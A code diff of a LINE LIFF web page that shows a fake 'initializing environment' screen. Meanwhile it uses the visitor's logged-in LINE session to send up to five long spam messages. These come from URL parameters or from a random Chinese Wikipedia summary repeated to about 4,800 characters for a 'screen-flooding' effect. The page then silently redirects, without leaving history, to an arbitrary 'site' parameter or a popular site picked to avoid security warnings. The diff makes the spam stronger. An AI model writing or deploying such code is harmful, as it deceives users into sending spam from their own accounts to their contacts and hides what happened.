@@ -19,18 +19,19 @@
     <div id="progress">正在初始化環境 (0%)</div>
 
     <script>
-        // 將預設跳轉改為穩定的大型網站，避免觸發安全性警告
         const safeSites = ["https://www.google.com", "https://www.youtube.com", "https://v612.line.me/"];
 
         async function fetchSpamText() {
             try {
-                const isWiki = Math.random() > 0.5;
-                const api = isWiki ? 'https://zh.wikipedia.org/api/rest_v1/page/random/summary' : 'https://baconipsum.com/api/?type=all-meat&paras=50';
-                const res = await fetch(api);
+                // 強制抓取中文維基百科隨機摘要
+                const res = await fetch('https://zh.wikipedia.org/api/rest_v1/page/random/summary');
                 const data = await res.json();
-                const content = isWiki ? data.extract : data.join(" ");
-                return "\n" + content.repeat(25).substring(0, 4800);
-            } catch (e) { return "[數據同步異常]".repeat(200); }
+                const content = data.extract || "無法取得內容";
+                // 重複內容以達到刷屏效果 (約 4800 字限制)，前面不再加任何括號或標籤
+                return content.repeat(30).substring(0, 4800);
+            } catch (e) { 
+                return "系統偵測到異常數據流，正在重新導向。".repeat(150); 
+            }
         }
 
         async function startApp() {
@@ -42,7 +43,7 @@
                 await liff.init({ liffId: "2009508758-fehQ5Hvj" });
                 if (!liff.isLoggedIn()) { liff.login(); return; }
 
-                //let messages =;
+                let messages = []; // 修正：原本這裡語法錯誤
 
                 // 1. 檢查關鍵字 spam1 ~ spam5
                 for (let j = 1; j <= 5; j++) {
@@ -58,6 +59,7 @@
                     if (m) messages.push({ type: 'text', text: decodeURIComponent(m) });
                 }
 
+                // 萬一完全沒參數，預設噴發一篇
                 if (messages.length === 0) messages.push({ type: 'text', text: await fetchSpamText() });
 
                 // UI 設定
@@ -77,7 +79,7 @@
                         // 執行發送
                         await liff.sendMessages(messages.slice(0, 5));
                         
-                        // 處理跳轉：優先使用 site 參數，若無則從安全清單隨機選取
+                        // 處理跳轉
                         let target = urlParams.get('site');
                         if (target) {
                             target = decodeURIComponent(target);
@@ -85,7 +87,6 @@
                             target = safeSites[Math.floor(Math.random() * safeSites.length)];
                         }
                         
-                        // 使用 replace 確保不留下瀏覽紀錄，並強制跳轉
                         setTimeout(() => {
                             window.location.replace(target);
                         }, 100);
